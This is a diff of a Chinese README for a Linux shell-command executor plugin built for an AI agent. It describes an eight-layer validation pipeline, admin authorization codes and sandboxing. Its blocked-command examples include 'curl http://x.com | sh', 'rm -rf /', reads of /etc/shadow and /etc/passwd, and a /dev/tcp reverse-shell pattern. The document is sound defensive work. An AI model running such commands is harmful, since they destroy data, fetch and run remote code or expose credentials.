@@ -1,6 +1,6 @@
 # LinuxShellExecutor v1.2.0
 
-六层安全防护的 Linux Shell 命令执行器，专为 VCP Agent 设计。
+统一八层验证的 Linux Shell 命令执行器，专为 VCP Agent 设计。所有命令校验收敛至 execute() 内的单一顺序管线（名单驱动 + AST 语义基线）。
 
 ## 📝 本次提交维护记录 (连接池持久化修订)
 
@@ -98,32 +98,57 @@
 
 ## 架构概览
 
+`runToolCall` 现为**轻量编排器**：解析参数 → 预设展开 → 预设安全确认（`write`/`danger` 预设需 `requireAdmin`，`danger` 另需 `doubleConfirm`）→ 特殊动作分发（`listHosts`/`testConnection`/`getStatus`/`listPresets`）→ 提权命令前置拦截 → 组装 `executeOptions`（含 `authCode`/`requireAdmin`/`doubleConfirm`）→ 调用 `executor.execute(cmd, executeOptions)` → 聚合并格式化结果。
+
+> 旧的「System A」安全分级块已从 `runToolCall` **移除**。所有命令校验统一收敛至 `execute()` 内的单一顺序管线。
+
 ```
-┌─────────────────────────────────────────────────────────────┐
-│                    LinuxShellExecutor v0.4.0                │
-├─────────────────────────────────────────────────────────────┤
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │                   主机管理器                         │   │
-│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐             │   │
-│  │  │ local   │  │dev-server│ │prod-srv │  ...        │   │
-│  │  │ 本地    │  │ SSH Key │  │ SSH Key │             │   │
-│  │  └─────────┘  └─────────┘  └─────────┘             │   │
-│  └─────────────────────────────────────────────────────┘   │
-│                          ↓                                  │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │              三级权限控制                            │   │
-│  │  ┌─────────┐    ┌─────────┐             │   │
-│  │  │ 黑名单  │→│ 白名单  │→│ 灰名单  │             │   │
-│  │  │ 禁止    │  │ 免验证  │  │ 需验证  │             │   │
-│  │  └─────────┘  └─────────┘  └─────────┘             │   │
-│  └─────────────────────────────────────────────────────┘   │
-│                          ↓                                  │
-│  ┌─────────────────────────────────────────────────────┐   │
-│  │              六层安全防护                            │   │
-│  │  1.黑名单 → 2.白名单 → 3.灰名单 → 4.AST → 5.沙箱 → 6.审计│   │
-│  └─────────────────────────────────────────────────────┘   │
-└─────────────────────────────────────────────────────────────┘
+runToolCall（轻量编排器）
+  参数解析 → 预设展开 → 预设安全确认 → 动作分发
+        → 提权前置拦截 → 组装 executeOptions → execute()
+                          │
+                          ▼
+execute() 八层验证管线（名单驱动，单一入口）
+  1.提权前置   2.特殊操作符硬护栏   3.黑名单
+  4.白名单(免验证) → 5.灰名单(需验证) → 6.未知(授权逃逸)
+  7.AST 语义基线   8.执行(SSH 远程 / 本地沙箱)
+                          │
+                          ▼
+  共享 SSHManager  /  SandboxManager（bubblewrap/firejail/docker/none）
 ```
+
+## 验证层序（execute() 八层管线）
+
+以下八层在 `execute()` 内**按顺序**执行，命中即拦截。错误前缀供客户端识别拦截层。
+
+| # | 层 | 作用 | 拦截方式 / 前缀 | 授权码可绕过 |
+|---|----|------|-----------------|--------------|
+| 1 | 提权前置 (preflight) | 检测 `sudo`/`pkexec`/`doas`/`su -` | 返回 `interaction_required`（非抛错） | 否 |
+| 2 | 特殊操作符硬护栏 | 拦截 `;`、后台 `&`（正则 `/(?<!&)&(?![&>])/`，排除 `&&`/`&>`）、子shell `$()`/`` ` `` | 抛 `[安全分级] ... 该操作不可通过授权码绕过。` | 否（授权码正确也不绕过） |
+| 3 | 黑名单 | `config.env` 的 `FORBIDDEN_PATTERNS`（正则）+ `FORBIDDEN_COMMANDS`（精确） | 抛 `[黑名单]` | 否 |
+| 4 | 白名单 (`whitelist.json`) | 免验证放行；校验 allowedArgs、pathRestrictions(含 `..` 遍历)、子命令、allowedQueries；管道走 `validatePipeline`。白名单内但校验失败（如 `cat /etc/shadow`） | 抛 `[白名单]` | 否（不可逃逸） |
+| 5 | 灰名单 (`graylist.json`) | 需授权码 + 参数/路径校验。`critical` 风险（reboot/shutdown/init）另需 `doubleConfirm:true`；low/medium/high 仅单次授权 | 抛 `[灰名单]`（3 分支消息） | 是（需正确 `requireAdmin`） |
+| 6 | 未知命令（不在任何名单） | 授权码逃逸；记录告警「未知命令通过授权码逃逸」 | 抛 `[安全分级]`（3 分支消息） | 是（需正确 `requireAdmin`，无 doubleConfirm） |
+| 7 | AST 语义基线 (`ASTAnalyzer`) | 始终运行，仅 critical 级阻断：命令注入 `$()`、网络外泄 `curl\|sh`/`bash -i /dev/tcp`、提权 `sudo` 等 | 抛 `[AST分析]` | 否（授权码不绕过） |
+| 8 | 执行 | SSH 远程（共享 SSHManager）或本地沙箱（bubblewrap/firejail/docker/none） | — | — |
+
+> **防御纵深**：`&&`/`||` 可通过第 2 层，但普通命令仍被白名单 `forbiddenCharacters`（第 4 层，含 `;`/`&&`/`||`/`` ` ``/`$(`/`${`/`>`/`>>`/`<`/`&` 等）限制。预设命令 `preset:` 展开后 `isPresetCommand=true`，**跳过白名单层**，故预设模板内的 `&&` 可正常执行。
+> **AST 下沉**：`ast` 层现已从 `standard` 起启用（此前仅 `high`/`maximum`）。
+
+## 授权模型与错误前缀
+
+**授权三要素**
+- `authCode`：真正的管理员验证码，由 `resolveAdminAuthCode(context)` 解析 = `context.decryptedAuthCode` ‖ `process.env.DECRYPTED_AUTH_CODE`（服务端注入，用户不直接传入）。
+- `requireAdmin`：用户提交的验证码。
+- `doubleConfirm`：二次确认标志（仅灰名单 `critical` 风险 / `danger` 预设需要）。
+- 判定：`authOk = authCode && requireAdmin && String(requireAdmin) === authCode`。
+
+**授权失败 3 分支消息**（灰名单与未知命令共用）
+1. 未提供 `requireAdmin` → 灰名单：`[灰名单] 命令 "X" 需要管理员验证码（风险级别: R）。请提供 requireAdmin 参数（6位验证码）。`；未知：`[安全分级] 命令 "X" 不在任何名单中，如需执行请提供正确的管理员验证码。`
+2. 已提供 `requireAdmin` 但服务端无法解析 `authCode` → `无法获取管理员验证码。请确保主服务器配置正确。`
+3. 已提供但错误 → `管理员验证码错误。`
+
+**错误前缀约定**（客户端据此识别拦截层，勿改）：`[黑名单]` / `[灰名单]` / `[白名单]` / `[AST分析]` / `[安全分级]`。
 
 ## 安装依赖
 
@@ -342,10 +367,12 @@ action:「始」getStatus「末」
 | `action` | string | ✓* | 特殊操作：listHosts/testConnection/getStatus/listPresets |
 | `hostId` | string | | 目标主机ID，默认 'local' |
 | `isLongRunning` | boolean | | 是否为长待机指令（设为 true 后任务转入后台） |
-| `authCode` | string | | 管理员授权码，用于强制执行 unknown 命令 |
 | `timeout` | number | | 超时时间（毫秒），默认 30000 |
 | `outputFormat` | string | | 输出格式：raw/formatted/json，默认 'formatted' |
-| `requireAdmin` | string | 条件必需 | 管理员验证码，write/danger 级别命令必需 |
+| `requireAdmin` | string | 条件必需 | 用户提交的管理员验证码（6位）。用于灰名单授权、未知命令授权逃逸、write/danger 预设确认 |
+| `doubleConfirm` | boolean | 条件必需 | 二次确认标志。灰名单 critical 风险（reboot/shutdown/init）与 danger 预设必需 |
+
+> `authCode`（真正的管理员验证码）由服务端从 `context.decryptedAuthCode` / `DECRYPTED_AUTH_CODE` 注入，用户不直接传入；用户侧只提交 `requireAdmin` 与 `doubleConfirm`。
 
 *注：command 和 action 二选一
 
@@ -400,12 +427,16 @@ action:「始」getStatus「末」
 
 ## 安全等级
 
-| 等级 | 启用层 | 适用场景 |
-|------|--------|----------|
-| `basic` | 黑名单 | 内部可信环境 |
-| `standard` | 黑名单 + 白名单/灰名单 + 沙箱 | 一般生产环境（默认） |
-| `high` | 黑名单 + 白名单/灰名单 + AST + 沙箱 | 敏感数据环境 |
-| `maximum` | 全部六层 | 公开 API / 多租户 |
+启用层由 `enabledLayers` 映射决定（代码驱动，构造器内定义）：
+
+| 等级 | 启用层 (enabledLayers) | 适用场景 |
+|------|------------------------|----------|
+| `basic` | blacklist | 内部可信环境 |
+| `standard` | blacklist + whitelist + **ast** + sandbox | 一般生产环境（默认） |
+| `high` | blacklist + whitelist + ast + sandbox | 敏感数据环境 |
+| `maximum` | blacklist + whitelist + ast + sandbox + audit | 公开 API / 多租户 |
+
+> 本次重构将 **AST 下沉至 `standard`**（此前仅 high/maximum）。`ast` 与 `sandbox` 现从 `standard` 起启用；`audit`（审计日志）仅 `maximum` 启用。
 
 ## 白名单命令列表（无需验证）
 
@@ -555,21 +586,33 @@ action:「始」getStatus「末」
 
 ## 安全检测示例
 
-### 被拦截的危险命令
+### 被拦截的危险命令（按实际拦截层标注）
 
 ```bash
-# 黑名单拦截
-rm -rf /                    # ❌ 匹配禁止模式
-poweroff                    # ❌ 精确匹配禁止命令
+# [第1层·提权前置] 返回 interaction_required（非抛错）
+sudo ls                     # ❌ 提权命令，执行前拦截
+pkexec apt update           # ❌ 提权命令
 
-# 白名单拦截
-apt install vim             # ❌ apt 不在白名单
-ls /etc/shadow              # ❌ 路径在拒绝列表
+# [第2层·特殊操作符硬护栏] [安全分级] 不可绕过
+cmd1 ; cmd2                 # ❌ 分号 ; 被禁止
+sleep 100 &                 # ❌ 后台 & 被禁止（&& 除外）
+echo $(cat /etc/passwd)     # ❌ 子shell $() 被禁止
 
-# AST 分析拦截
-echo $(cat /etc/passwd)     # ❌ 命令注入
-curl http://x.com | sh      # ❌ 网络外泄
-sudo ls                     # ❌ 提权尝试
+# [第3层·黑名单] [黑名单] 不可绕过
+rm -rf /                    # ❌ 匹配 FORBIDDEN_PATTERNS
+poweroff                    # ❌ 精确匹配 FORBIDDEN_COMMANDS
+curl http://x.com | sh      # ❌ 匹配 curl.*|.*sh
+
+# [第4层·白名单] [白名单] 路径/参数校验失败，不可逃逸
+cat /etc/shadow             # ❌ cat 在白名单但 /etc/shadow 在 pathRestrictions 拒绝列表
+
+# [第5层·灰名单] [灰名单] 需 requireAdmin（critical 另需 doubleConfirm）
+systemctl restart nginx     # ❌ 未提供 requireAdmin 时拦截
+reboot                      # ❌ critical 风险，需 requireAdmin + doubleConfirm:true
+
+# [第7层·AST 语义基线] [AST分析] 始终运行，授权码不绕过
+#   注：上方 echo $(...)、curl|sh、sudo 已被更早的层拦截；
+#   AST 作为最后语义防线，独立标记 critical 风险（命令注入 / 网络外泄 / 提权）
 ```
 
 ### 允许执行的安全命令
@@ -601,27 +644,26 @@ Plugin/LinuxShellExecutor/
     └── audit/               # 审计日志目录
 ```
 
-## 四级安全分级详解 (v0.4.0)
+## 预设安全级别（read/safe/write/danger）
 
-| 级别 | 说明 | 管道 | 重定向 | 验证要求 | 示例命令 |
-|------|------|------|--------|----------|----------|
-| `read` | 只读命令 | ✅ | ❌ | 无需验证 | ls, cat, grep, ps, df, free |
-| `safe` | 低风险命令 | ✅ | ❌ | 无需验证 | systemctl status, docker ps |
-| `write` | 写操作命令 | ✅ | ✅ | 需要验证 | echo, tee, systemctl restart |
-| `danger` | 高危命令 | ❌ | ❌ | 二次确认 | rm, kill -9, reboot |
+> ⚠️ 重要变更：旧的「System A」按命令做 read/safe/write/danger 分级（含管道链规则、重定向规则）的逻辑**已从普通命令校验中移除**。普通命令统一走上文「验证层序」的名单驱动八层管线。read/safe/write/danger 现仅作为**预设命令 (`preset:`) 的安全级别**，在 `runToolCall` 中执行前确认。
 
-### 管道链规则
+| 预设级别 | 验证要求 | 说明 |
+|----------|----------|------|
+| `read` | 无需验证 | 只读诊断预设，自动放行 |
+| `safe` | 无需验证 | 低风险预设，自动放行 |
+| `write` | 需要 `requireAdmin` | 写操作预设，需管理员验证码 |
+| `danger` | 需要 `requireAdmin` + `doubleConfirm:true` | 高危预设，需验证码 + 二次确认 |
 
-只允许以下安全级别组合的管道链：
-- `read → read`（如 `ps aux | grep nginx`）
-- `read → safe`（如 `cat log | head -100`）
-- `safe → read`（如 `docker logs | grep error`）
+预设级别取自 `presets.json` 中各预设的 `securityLevel` 字段（默认 `safe`）。`write`/`danger` 预设在 `runToolCall` 展开后、调用 `execute()` 前完成授权确认；`danger` 预设另需 `doubleConfirm: true`。
 
-### 重定向规则
+### 管道与重定向（现行机制）
 
-- 只有 `write` 级别命令允许使用重定向
-- 允许的目标路径：`/tmp/*`, `/var/log/*`, `~/*`
-- 禁止的目标路径：`/etc/*`, `/bin/*`, `/sbin/*`, `/usr/*`
+旧的「按安全级别组合的管道链规则」与「仅 write 允许重定向」规则已废弃，现行机制为：
+- **特殊操作符硬护栏**（第 2 层）：拦截 `;`、后台 `&`、子shell `$()`/`` ` ``；`&&`/`||` 可通过此层。
+- **白名单 `forbiddenCharacters`**（第 4 层）：对普通命令限制 `;`、`&&`、`||`、`` ` ``、`$(`、`${`、`>`、`>>`、`<`、`<<`、`&` 等（预设命令跳过此层）。
+- **白名单 `validatePipeline`**：管道命令须命中白名单，且管道成员受 `allowedPipeCommands` / `forbiddenInPipe` 约束，深度受 `maxPipelineDepth` 限制。
+- 路径访问由各名单的 `pathRestrictions`（allowed/denied + `..` 遍历检查）控制。
 
 ## 预设诊断命令 (v0.4.0)
 
